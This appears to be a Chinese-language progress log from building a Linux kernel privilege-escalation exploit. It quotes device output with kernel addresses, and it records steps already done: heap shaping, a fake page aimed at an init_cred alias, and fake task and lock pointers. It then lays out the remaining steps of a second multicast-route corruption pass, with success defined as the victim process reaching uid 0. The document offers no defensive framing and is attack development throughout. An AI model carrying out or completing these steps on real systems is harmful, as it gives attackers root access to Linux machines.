# 43499 · W2b 前半段落地（round 117）：第二份页面已在内核里

## 真机逐字

```
main: repair target=0xffffff802abfd590 mode=1 preserve=0 pc=0xffffff802abfd588 right=0x0 left=0x0
      （叶子臂 ✓ 与退役 write_layout 同形 ✓）
main: repair prepared base=0xffff800000048000 page=0xffff800000047180 sent=65536/0
      （第二次准备 ✓ 新 base ✓；第二份页面 verdict=0=Ok ✓；65536 B 已发送 ✓）
main: victim uid=2000    （预期：第二轮尚未跑 ✓）
```

## 已完成（A 路的 1-3 步 ✓）

1. **第二次准备** ✓：`run_prepare` 再跑一次 ⇒ 新 base ✓ + 第二对 shaping fd ✓；
2. **第二份页面** ✓：用修复请求（`target=init_cred 别名+8`、`Zero`、`leaf=1` ✓）建页，`verdict=Ok` ✓；
   `repair_inputs` 的 `waiter_word`/`fake_task`/`fake_lock` 全部指向 `repair_base = base2 + delta` ✓；
3. **第二次发送** ✓：`send_bytes(fd2, repair_image, 65536)` ✓ ⇒ 第二份页面在内核里，地址 **已知** ✓。

## 剩下的（第 4-5 步 ✓，规格已完全定死）

4. **第二份 route 配置**：`route_values2 = route_values`（复制 ✓）后覆盖：
   `fake_task = repair_base + slots.fake_task` ✓、`fake_lock = repair_base + slots.lock` ✓、
   `target = repair_request.target` ✓、`value = repair_layout.value`（= 0 ✓）；
   ⇒ `build_route_config(route_values2)` ✓；
5. **第二轮**：`MulticastRoute<LinuxRouteOps> route2{config2}` ✓ ⇒ `route2.execute(target, value, 0)` ✓
   （或走窗口步骤 ✓）⇒ 之后照旧打印 `route2.report()` ✓；
6. **判据**：`main: victim uid=0` ✓；旁证：第二轮 `status=0 clean=1/1 step=0` ✓。
